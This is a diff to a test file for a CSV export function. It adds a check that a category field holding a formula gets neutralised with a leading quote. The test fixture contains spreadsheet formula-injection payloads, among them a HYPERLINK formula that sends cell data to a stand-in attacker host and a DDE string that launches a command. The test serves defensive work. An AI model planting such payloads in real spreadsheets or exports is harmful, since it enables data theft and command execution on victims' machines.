@@ -63,7 +63,7 @@ describe("buildExportCsv", () => {
       rows: [{
         id: "x", txn_date: "2026-05-01",
         merchant: '=HYPERLINK("http://evil.example/?d="&A1,"Receipt")',
-        cat_key: "office", amount_cents: -3300, gst_cents: -300, deductible_pct: 100,
+        cat_key: "=danger()", amount_cents: -3300, gst_cents: -300, deductible_pct: 100,
         payment_method: "@SUM(A1:A9)", note: "-2+3+cmd|' /C calc'!A0",
       }],
       receiptKeyByTxnId: new Map(),
@@ -79,6 +79,8 @@ describe("buildExportCsv", () => {
     // payment_method (@...) and note (-...) are prefixed with a leading quote.
     expect(lines[2]).toContain("'@SUM(A1:A9)");
     expect(lines[2]).toContain("'-2+3");
+    // category (cat_key) is now neutralized too (L7).
+    expect(lines[2]).toContain("'=danger()");
     // Legitimate negative dollar amounts are numeric columns — NOT prefixed.
     expect(lines[2]).toContain("-33.00");
     expect(lines[2]).not.toContain("'-33.00");
